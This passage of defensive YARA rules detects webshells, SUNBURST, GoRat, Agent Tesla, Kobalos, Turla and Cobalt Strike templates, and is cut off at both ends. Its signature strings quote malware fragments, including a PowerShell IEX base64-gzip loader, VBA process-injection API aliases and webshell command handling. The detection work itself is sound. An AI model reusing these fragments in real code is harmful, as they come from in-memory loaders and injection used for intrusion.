		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8990-L9001"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c19d6f4e069188f19b08fa94d44bc283"
		logic_hash = "536232bbdd21bddb88eefe06a82927abcdd3ed10404c052957896960a6d10932"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "strBackDoor = strBackDoor "

	condition:
		all of them
}

rule SIGNATURE_BASE_R57Shell_3
{
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "4129d77c-2981-587b-a83e-8767dc3a48d8"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L9002-L9013"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "87995a49f275b6b75abe2521e03ac2c0"
		logic_hash = "0fdca080c7ce57b7bd818a968840aebf3c5c74f188ed062fec794bfadb4e75b0"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<b>\".$_POST['cmd']"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Ajan_2
{
	meta:
		description = "Webshells Auto-generated - file ajan.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "a66c34ed-0ae2-5e04-bfc4-c82583c5e066"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L9030-L9042"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "22194f8c44524f80254e1b5aec67b03e"
		logic_hash = "0ac31ee735c94289932369dfba5b408cbf71cc23fd48ce3e09dc7ce640a0d733"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "\"Set WshShell = CreateObject(\"\"WScript.Shell\"\")"
		$s3 = "/file.zip"

	condition:
		all of them
}

rule SIGNATURE_BASE_MAL_PHISH_Final_Payload_Feb25
{
	meta:
		description = "Detects possible final payload of phishing-delivered malware, where embedded shellcode is used to decrypt and execute the payload after user-supplied password input."
		author = "X__Junior"
		id = "9014e1f2-09c2-5ba0-8b7c-6ae8c069d1f7"
		date = "2025-02-14"
		modified = "2025-03-20"
		reference = "https://x.com/dtcert/status/1890384162818802135"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/mal_phish_feb25.yar#L16-L35"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "de384aba6b0c6800095eb530954aa718d4ed96cccfc0b1e5e4d01404f3518a77"
		logic_hash = "3251d68a019d873987966d46c9e474e5a1ebbca4a33a8bf1e3c3ce119db8ab8c"
		score = 80
		quality = 85
		tags = ""

	strings:
		$s1 = "%lu: %s %s" wide
		$s2 = "(Direct Inbound)" wide
		$s3 = "(Primary Domain)" wide
		$s4 = "(Forest Tree Root" wide
		$s5 = "(Native Mode)" wide
		$s6 = "(In Forest)" wide
		$s7 = "(None)" wide

	condition:
		all of them
}

rule SIGNATURE_BASE_Crowdstrike_Shamoon_Droppedfile
{
	meta:
		description = "Rule to detect Shamoon malware http://goo.gl/QTxohN"
		author = "Florian Roth"
		id = "b350f1b1-db73-574b-957b-34e5a84f68b0"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "http://www.rsaconference.com/writable/presentations/file_upload/exp-w01-hacking-exposed-day-of-destruction.pdf"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_shamoon.yar#L1-L13"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "ed550832b217f7edceea2edf7c4453925ed1759d97db7728f7face6ff10ee361"
		score = 75
		quality = 85
		tags = ""

	strings:
		$testn123 = "test123" wide
		$testn456 = "test456" wide
		$testn789 = "test789" wide
		$testdomain = "testdomain.com" wide
		$pingcmd = "ping -n 30 127.0.0.1 >nul" wide

	condition:
		( any of ( $testn* ) or $pingcmd ) and $testdomain
}

rule SIGNATURE_BASE_Power_Pe_Injection
{
	meta:
		description = "PowerShell with PE Reflective Injection"
		author = "Benjamin DELPY (gentilkiwi)"
		id = "a71fe9f2-9c2a-5650-a5c7-116b76f10db6"
		date = "2023-12-05"
		modified = "2023-12-05"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_mimikatz.yar#L91-L101"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "64a7033d51e8933912f37ce68bffc216073a88cae1ea7492e71a812411ae6a9d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$str_loadlib = "0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9"

	condition:
		$str_loadlib
}

rule SIGNATURE_BASE_APT_Backdoor_SUNBURST_2
{
	meta:
		description = "The SUNBURST backdoor uses a domain generation algorithm (DGA) as part of C2 communications. This rule is looking for each branch of the code that checks for which HTTP method is being used. This is in one large conjunction, and all branches are then tied together via disjunction. The grouping is intentionally designed so that if any part of the DGA is re-used in another sample, this signature should match that re-used portion. SUNBURST is a backdoor that has the ability to spawn and kill processes, write and delete files, set and create registry keys, gather system information, and disable a set of forensic analysis tools and services."
		author = "FireEye"
		id = "329071d5-c9c6-5ae1-a514-aea9f4037bac"
		date = "2020-12-14"
		modified = "2023-12-05"
		reference = "https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/apt_solarwinds_sunburst.yar#L28-L79"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		logic_hash = "2bf0697b110bca88f712cbccaf0d2ba614d6093d6d9595659aefe088848d3826"
		score = 85
		quality = 83
		tags = ""

	strings:
		$a = "0y3Kzy8BAA==" wide
		$aa = "S8vPKynWL89PS9OvNqjVrTYEYqNa3fLUpDSgTLVxrR5IzggA" wide
		$ab = "S8vPKynWL89PS9OvNqjVrTYEYqPaauNaPZCYEQA=" wide
		$ac = "C88sSs1JLS4GAA==" wide
		$ad = "C/UEAA==" wide
		$ae = "C89MSU8tKQYA" wide
		$af = "8wvwBQA=" wide
		$ag = "cyzIz8nJBwA=" wide
		$ah = "c87JL03xzc/LLMkvysxLBwA=" wide
		$ai = "88tPSS0GAA==" wide
		$aj = "C8vPKc1NLQYA" wide
		$ak = "88wrSS1KS0xOLQYA" wide
		$al = "c87PLcjPS80rKQYA" wide
		$am = "Ky7PLNAvLUjRBwA=" wide
		$an = "06vIzQEA" wide
		$b = "0y3NyyxLLSpOzIlPTgQA" wide
		$c = "001OBAA=" wide
		$d = "0y0oysxNLKqMT04EAA==" wide
		$e = "0y3JzE0tLknMLQAA" wide
		$f = "003PyU9KzAEA" wide
		$h = "0y1OTS4tSk1OBAA=" wide
		$i = "K8jO1E8uytGvNqitNqytNqrVA/IA" wide
		$j = "c8rPSQEA" wide
		$k = "c8rPSfEsSczJTAYA" wide
		$l = "c60oKUp0ys9JAQA=" wide
		$m = "c60oKUp0ys9J8SxJzMlMBgA=" wide
		$n = "8yxJzMlMBgA=" wide
		$o = "88lMzygBAA==" wide
		$p = "88lMzyjxLEnMyUwGAA==" wide
		$q = "C0pNL81JLAIA" wide
		$r = "C07NzXTKz0kBAA==" wide
		$s = "C07NzXTKz0nxLEnMyUwGAA==" wide
		$t = "yy9IzStOzCsGAA==" wide
		$u = "y8svyQcA" wide
		$v = "SytKTU3LzysBAA==" wide
		$w = "C84vLUpOdc5PSQ0oygcA" wide
		$x = "C84vLUpODU4tykwLKMoHAA==" wide
		$y = "C84vLUpO9UjMC07MKwYA" wide
		$z = "C84vLUpO9UjMC04tykwDAA==" wide

	condition:
		($a and $b and $c and $d and $e and $f and $h and $i ) or ( $j and $k and $l and $m and $n and $o and $p and $q and $r and $s and ( $aa or $ab ) ) or ( $t and $u and $v and $w and $x and $y and $z and ( $aa or $ab ) ) or ( $ac and $ad and $ae and $af and $ag and $ah and ( $am or $an ) ) or ( $ai and $aj and $ak and $al and ( $am or $an ) )
}

rule SIGNATURE_BASE_APT_Backdoor_Win_Gorat_Memory_1
{
	meta:
		description = "Identifies GoRat malware in memory based on strings."
		author = "FireEye"
		id = "4fcdd98f-1873-58e1-a9f5-73ee0aa5a69f"
		date = "2025-02-12"
		modified = "2025-02-12"
		reference = "https://www.fireeye.com/blog/products-and-services/2020/12/fireeye-shares-details-of-recent-cyber-attack-actions-to-protect-community.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_fireeye_redteam_tools.yar#L1013-L1039"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3b926b5762e13ceec7ac3a61e85c93bb"
		logic_hash = "bf8d80b7a7d35c1bcb353ff66d10bc95c2e6502043acc6554887465a467cdcf7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$rat1 = "rat/modules/socks.(*HTTPProxyClient).beacon" fullword
		$rat2 = "rat.(*Core).generateBeacon" fullword
		$rat3 = "rat.gJitter" fullword
		$rat4 = "rat/comms.(*protectedChannel).SendCmdResponse" fullword
		$rat5 = "rat/modules/filemgmt.(*acquire).NewCommandExecution" fullword
		$rat6 = "rat/modules/latlisten.(*latlistensrv).handleCmd" fullword
		$rat7 = "rat/modules/netsweeper.(*netsweeperRunner).runSweep" fullword
		$rat8 = "rat/modules/netsweeper.(*Pinger).listen" fullword
		$rat9 = "rat/modules/socks.(*HTTPProxyClient).beacon" fullword
		$rat10 = "rat/platforms/win/dyloader.(*memoryLoader).ExecutePluginFunction" fullword
		$rat11 = "rat/platforms/win/modules/namedpipe.(*dummy).Open" fullword
		$winblows = "rat/platforms/win.(*winblows).GetStage" fullword

	condition:
		$winblows or 3 of ( $rat* )
}

rule SIGNATURE_BASE_APT_Builder_PY_REDFLARE_2_1
{
	meta:
		description = "No description has been set in the source file - Signature Base"
		author = "FireEye"
		id = "74c56ee1-734e-5fdb-beee-6345a5993f68"
		date = "2020-12-01"
		modified = "2020-12-01"
		reference = "https://www.fireeye.com/blog/products-and-services/2020/12/fireeye-shares-details-of-recent-cyber-attack-actions-to-protect-community.html"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/gen_fireeye_redteam_tools.yar#L1376-L1391"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "4410e95de247d7f1ab649aa640ee86fb"
		logic_hash = "0f28fb23c0c1d589466c7c541c8dc588b038d02dded0c66c4a448d1f768c95c5"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "<510sxxII"
		$s2 = "0x43,0x00,0x3a,0x00,0x5c,0x00,0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,"
		$s3 = "parsePluginOutput"

	condition:
		all of them and #s2 == 2
}

rule CAPE_Agent_Tesla_1
{
	meta:
		description = "Detecting HTML strings used by Agent Tesla malware"
		author = "Stormshield"
		id = "5383994b-357d-539b-89b1-53be238f759d"
		date = "2025-03-07"
		modified = "2025-03-07"
		reference = "https://github.com/kevoreilly/CAPEv2"
		source_url = "https://github.com/kevoreilly/CAPEv2/blob/3468ef14dbf65c0c3219e32830860967d6da51d5/data/yara/CAPE/AgentTesla.yar#L1-L17"
		license_url = "https://github.com/kevoreilly/CAPEv2/blob/3468ef14dbf65c0c3219e32830860967d6da51d5/LICENSE"
		logic_hash = "3945754129dcc58e0abfd7485f5ff0c0afdd1078ae2cf164ca8f59a6f79db1be"
		score = 75
		quality = 70
		tags = ""
		version = "1.0"

	strings:
		$html_username = "<br>UserName&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " wide ascii
		$html_pc_name = "<br>PC&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;: " wide ascii
		$html_os_name = "<br>OS&nbsp;Full&nbsp;Name&nbsp;&nbsp;: " wide ascii
		$html_os_platform = "<br>OS&nbsp;Platform&nbsp;&nbsp;&nbsp;: " wide ascii
		$html_clipboard = "<br><span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span>" wide ascii

	condition:
		3 of them
}

rule DELIVRTO_SUSP_HTML_WASM_Smuggling_1
{
	meta:
		description = "Presence of Base64 JavaScript blob loading WASM"
		author = "delivr.to"
		id = "fc83bb4f-ba8a-52d2-b9ce-632da5341f77"
		date = "2024-02-28"
		modified = "2024-05-24"
		reference = "https://github.com/delivr-to/detections"
		source_url = "https://github.com/delivr-to/detections/blob/376762d71eb1777874d366136595994378416ef5/yara-rules/html_wasm.yar#L1-L13"
		license_url = "N/A"
		logic_hash = "4bca88862c28db947c04c40e40fdecc682223d1eb90c98350fbd6c5d8c6c4636"
		score = 70
		quality = 80
		tags = ""

	strings:
		$wasm = "WebAssembly.Module" base64
		$int = "WebAssembly.Instance" base64
		$inst = "WebAssembly.instantiate" base64

	condition:
		all of them
}

rule ESET_Kobalos_Ssh_Credential_Stealer_1
{
	meta:
		description = "Kobalos SSH credential stealer seen in OpenSSH client"
		author = "Marc-Etienne M.Léveillé"
		id = "b1fc5163-de48-57fc-8ae7-1f2be6c64d8a"
		date = "2020-11-02"
		modified = "2021-02-01"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/kobalos/kobalos.yar#L58-L73"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "be238f5c2cc976a5638584a8c0fc580f2076735aadfe374e8d4162ba723bce10"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$ = "user: %.128s host: %.128s port %05d user: %.128s password: %.128s"

	condition:
		any of them
}

rule ESET_Turla_Outlook_Filenames_1
{
	meta:
		description = "Turla Outlook filenames"
		author = "ESET Research"
		id = "3a08003d-50d6-5fdf-9f74-222335ebfa3e"
		date = "2018-08-22"
		modified = "2018-09-05"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/turla/turla-outlook.yar#L76-L91"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "3be86c9325de6634c032321beed131fdf1e1952afcb43258fb202d0097610501"
		score = 75
		quality = 80
		tags = ""
		contact = "github@eset.com"
		license = "BSD 2-Clause"

	strings:
		$s1 = "mapid.tlb"
		$s2 = "msmime.dll"
		$s3 = "scawrdot.db"

	condition:
		any of them
}

rule ESET_Sparklinggoblin_Mutex_1
{
	meta:
		description = "SparklingGoblin ChaCha20 loaders mutexes"
		author = "ESET Research"
		id = "e33d2bc1-29d6-5117-8e0f-31f8bced0979"
		date = "2021-05-20"
		modified = "2021-08-26"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/sparklinggoblin/SparklingGoblin.yar#L465-L489"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		hash = "2edbea43f5c40c867e5b6bbd93cc972525df598b"
		hash = "b6d245d3d49b06645c0578804064ce0c072cbe0f"
		hash = "8be6d5f040d0085c62b1459afc627707b0de89cf"
		hash = "4668302969fe122874fb2447a80378dcb671c86b"
		hash = "9bdecb08e16a23d271d0a3e836d9e7f83d7e2c3b"
		hash = "9ce7650f2c08c391a35d69956e171932d116b8bd"
		logic_hash = "00fbd514c8e2d6dea3b0f175e857a613e158b64caf1f970e814d62f1ebe9d35c"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"

	strings:
		$mutex_1 = "kREwdFrOlvASgP4zWZyV89m6T2K0bIno"
		$mutex_2 = "v5EPQFOImpTLaGZes3Nl1JSKHku8AyCw"

	condition:
		any of them
}

rule ESET_Apt_Windows_TA410_Tendyron_Installer_1
{
	meta:
		description = "TA410 Tendyron Installer"
		author = "ESET Research"
		id = "95ccad1c-99fb-5d38-aec0-650db3e06b35"
		date = "2020-12-09"
		modified = "2022-04-27"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/ta410/ta410.yar#L55-L73"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "9c3afb924747614f27c31cf2c3d98f4932a9d11597a3ac94263bf93be02801da"
		score = 75
		quality = 80
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "Tendyron" wide
		$s2 = "OnKeyToken_KEB.dll" wide
		$s3 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" wide
		$s4 = "Global\\8D32CCB321B2"
		$s5 = "\\RTFExploit\\"

	condition:
		int16 ( 0 ) == 0x5A4D and 3 of them
}

rule ESET_Apt_Windows_TA410_X4_Strings_1
{
	meta:
		description = "Matches various strings found in TA410 X4"
		author = "ESET Research"
		id = "e6af4516-8b79-5182-8571-7dd530632ddc"
		date = "2020-10-09"
		modified = "2022-04-27"
		reference = "https://github.com/eset/malware-ioc/"
		source_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/ta410/ta410.yar#L109-L125"
		license_url = "https://github.com/eset/malware-ioc/blob/eeab168d4cd6bac7c5bd06defb3d7198bd58f37f/LICENSE"
		logic_hash = "d4b2321a6d0eb0ca8d7c47596af2a45c22b3aef15d1832d64d6588a62cab312a"
		score = 75
		quality = 74
		tags = ""
		license = "BSD 2-Clause"
		version = "1"

	strings:
		$s1 = "[X]InLoadSC" ascii wide nocase
		$s3 = "MachineKeys\\Log\\rsa.txt" ascii wide nocase
		$s4 = "MachineKeys\\Log\\output.log" ascii wide nocase

	condition:
		any of them
}

rule FIREEYE_RT_APT_Backdoor_Win_Gorat_Memory_1
{
	meta:
		description = "Identifies GoRat malware in memory based on strings."
		author = "FireEye"
		id = "16fb1db7-711c-5d8d-9203-738c94f253fe"
		date = "2020-12-09"
		modified = "2020-12-09"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/REDFLARE (Gorat)/production/yara/APT_Backdoor_Win_GoRat_Memory.yar#L4-L27"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		hash = "3b926b5762e13ceec7ac3a61e85c93bb"
		logic_hash = "88272e59325d106f96d6b6f1d57daf968823c1e760067dee0334c66c521ce8c2"
		score = 75
		quality = 75
		tags = ""
		rev = 1

	strings:
		$murica = "murica" fullword
		$rat1 = "rat/modules/socks.(*HTTPProxyClient).beacon" fullword
		$rat2 = "rat.(*Core).generateBeacon" fullword
		$rat3 = "rat.gJitter" fullword
		$rat4 = "rat/comms.(*protectedChannel).SendCmdResponse" fullword
		$rat5 = "rat/modules/filemgmt.(*acquire).NewCommandExecution" fullword
		$rat6 = "rat/modules/latlisten.(*latlistensrv).handleCmd" fullword
		$rat7 = "rat/modules/netsweeper.(*netsweeperRunner).runSweep" fullword
		$rat8 = "rat/modules/netsweeper.(*Pinger).listen" fullword
		$rat9 = "rat/modules/socks.(*HTTPProxyClient).beacon" fullword
		$rat10 = "rat/platforms/win/dyloader.(*memoryLoader).ExecutePluginFunction" fullword
		$rat11 = "rat/platforms/win/modules/namedpipe.(*dummy).Open" fullword
		$winblows = "rat/platforms/win.(*winblows).GetStage" fullword

	condition:
		$winblows or #murica > 10 or 3 of ( $rat* )
}

rule FIREEYE_RT_Trojan_Macro_RESUMEPLEASE_1_1
{
	meta:
		description = "No description has been set in the source file - FireEye-RT"
		author = "FireEye"
		id = "068662f6-28b8-5538-8bc3-6506565305ae"
		date = "2020-12-01"
		date = "2020-12-01"
		modified = "2020-12-09"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/RESUMEPLEASE/production/yara/Trojan_Macro_RESUMEPLEASE_1.yar#L4-L21"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		hash = "d5d3d23c8573d999f1c48d3e211b1066"
		logic_hash = "040457bc446e496431129ff4623ddda5d9c2ce339ba65a7fbe42114626f36c60"
		score = 75
		quality = 75
		tags = ""
		rev = 1

	strings:
		$str00 = "For Binary As"
		$str01 = "Range.Text"
		$str02 = "Environ("
		$str03 = "CByte("
		$str04 = ".SpawnInstance_"
		$str05 = ".Create("

	condition:
		all of them
}

rule FIREEYE_RT_APT_Builder_PY_REDFLARE_1_1
{
	meta:
		description = "No description has been set in the source file - FireEye-RT"
		author = "FireEye"
		id = "3b5ad25d-ce66-572e-9a91-40a73b8fd447"
		date = "2020-11-27"
		date = "2020-11-27"
		modified = "2020-12-09"
		reference = "https://github.com/mandiant/red_team_tool_countermeasures/"
		source_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/rules/REDFLARE/production/yara/APT_Builder_PY_REDFLARE_1.yar#L4-L22"
		license_url = "https://github.com/mandiant/red_team_tool_countermeasures//blob/3561b71724dbfa3e2bb78106aaa2d7f8b892c43b/LICENSE.txt"
		hash = "d0a830403e56ebaa4bfbe87dbfdee44f"
		logic_hash = "1948cadb7242eb69bffbc222802ce9c1af38d7a846da09b6343b1449fe054e42"
		score = 75
		quality = 75
		tags = ""
		rev = 1

	strings:
		$1 = "LOAD_OFFSET_32 = 0x612"
		$2 = "LOAD_OFFSET_64 = 0x611"
		$3 = "class RC4:"
		$4 = "struct.pack('<Q' if is64b else '<L'"
		$5 = "stagerConfig['comms']['config']"
		$6 = "_x86.dll"
		$7 = "_x64.dll"

	condition:
		all of them and @1 [ 1 ] < @2 [ 1 ] and @2 [ 1 ] < @3 [ 1 ] and @3 [ 1 ] < @4 [ 1 ] and @4 [ 1 ] < @5 [ 1 ]
}

rule GCTI_Cobaltstrike_Resources_Template_X64_Ps1_V3_0_To_V4_X_Excluding_3_12_3_13_1
{
	meta:
		description = "Cobalt Strike's resources/template.x64.ps1, resources/template.hint.x64.ps1 and resources/template.hint.x32.ps1 from v3.0 to v4.x except 3.12 and 3.13"
		author = "gssincla@google.com"
		id = "5a808113-aacb-56ca-b3ec-166c73c54b85"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template_x64_Ps1_v3_0_to_v4_x_excluding_3_12_3_13.yara#L17-L37"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "ff743027a6bcc0fee02107236c1f5c96362eeb91f3a5a2e520a85294741ded87"
		logic_hash = "80823b8590004686ebd83958cad16094ea2f6958a837d87934507531a00df77a"
		score = 75
		quality = 81
		tags = ""

	strings:
		$dda = "[AppDomain]::CurrentDomain.DefineDynamicAssembly" nocase
		$imm = "InMemoryModule" nocase
		$mdt = "MyDelegateType" nocase
		$rd = "New-Object System.Reflection.AssemblyName('ReflectedDelegate')" nocase
		$data = "[Byte[]]$var_code = [System.Convert]::FromBase64String(" nocase
		$64bitSpecific = "[IntPtr]::size -eq 8"
		$mandatory = "Mandatory = $True"

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Template_Sct_V3_3_To_V4_X_1
{
	meta:
		description = "Cobalt Strike's resources/template.sct signature for versions v3.3 to v4.x"
		author = "gssincla@google.com"
		id = "9d2b1dfa-5f76-503f-9198-6ed0d039e0cb"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template_Sct_v3_3_to_v4_x.yara#L17-L38"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "fc66cb120e7bc9209882620f5df7fdf45394c44ca71701a8662210cf3a40e142"
		logic_hash = "8868445ced4945c469764b7f311d6cb11c99cf0f2d770113e5e617e0187a962c"
		score = 75
		quality = 85
		tags = ""

	strings:
		$scriptletstart = "<scriptlet>" nocase
		$registration = "<registration progid=" nocase
		$classid = "classid=" nocase
		$scriptlang = "<script language=\"vbscript\">" nocase
		$cdata = "<![CDATA["
		$scriptend = "</script>" nocase
		$antiregistration = "</registration>" nocase
		$scriptletend = "</scriptlet>"

	condition:
		all of them and @scriptletstart [ 1 ] < @registration [ 1 ] and @registration [ 1 ] < @classid [ 1 ] and @classid [ 1 ] < @scriptlang [ 1 ] and @scriptlang [ 1 ] < @cdata [ 1 ]
}

rule GCTI_Cobaltstrike_Resources_Command_Ps1_V2_5_To_V3_7_And_Resources_Compress_Ps1_V3_8_To_V4_X_1
{
	meta:
		description = "Cobalt Strike's resources/command.ps1 for versions 2.5 to v3.7 and resources/compress.ps1 from v3.8 to v4.x"
		author = "gssincla@google.com"
		id = "c0b81deb-ed20-5f7e-8e15-e6a9e9362594"
		date = "2022-11-18"
		modified = "2022-11-22"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Command_Ps1_v2_5_to_v3_7_and_Resources_Compress_Ps1_v3_8_to_v4_x.yara#L17-L33"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "932dec24b3863584b43caf9bb5d0cfbd7ed1969767d3061a7abdc05d3239ed62"
		logic_hash = "31cf47060757b086d325cd205724a7be8931bbbc6ff2f4be67a6179ee99c42ca"
		score = 75
		quality = 85
		tags = ""

	strings:
		$ps1 = "$s=New-Object \x49O.MemoryStream(,[Convert]::\x46romBase64String(" nocase
		$ps2 = "));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();" nocase

	condition:
		all of them
}

rule GCTI_Cobaltstrike_Resources_Template_X86_Vba_V3_8_To_V4_X_1
{
	meta:
		description = "Cobalt Strike's resources/template.x86.vba signature for versions v3.8 to v4.x"
		author = "gssincla@google.com"
		id = "11c7758e-93b2-5fe3-873d-b98de579d2b4"
		date = "2022-11-18"
		modified = "2022-11-19"
		reference = "https://cloud.google.com/blog/products/identity-security/making-cobalt-strike-harder-for-threat-actors-to-abuse"
		source_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/YARA/CobaltStrike/CobaltStrike__Resources_Template_x86_Vba_v3_8_to_v4_x.yara#L17-L37"
		license_url = "https://github.com/chronicle/GCTI/blob/1c5fd42b1895098527fde00c2d9757edf6b303bb/LICENSE"
		hash = "fc66cb120e7bc9209882620f5df7fdf45394c44ca71701a8662210cf3a40e142"
		logic_hash = "7114515477d82651806eccef34f599f6ffd4614f987dee29417ac6ef7a1a1c38"
		score = 75
		quality = 85
		tags = ""

	strings:
		$createstuff = "Function CreateStuff Lib \"kernel32\" Alias \"CreateRemoteThread\"" nocase
		$allocstuff = "Function AllocStuff Lib \"kernel32\" Alias \"VirtualAllocEx\"" nocase
		$writestuff = "Function WriteStuff Lib \"kernel32\" Alias \"WriteProcessMemory\"" nocase
		$runstuff = "Function RunStuff Lib \"kernel32\" Alias \"CreateProcessA\"" nocase
		$vars = "Dim rwxpage As Long" nocase
		$res = "RunStuff(sNull, sProc, ByVal 0&, ByVal 0&, ByVal 1&, ByVal 4&, ByVal 0&, sNull, sInfo, pInfo)"
		$rwxpage = "AllocStuff(pInfo.hProcess, 0, UBound(myArray), &H1000, &H40)"

	condition:
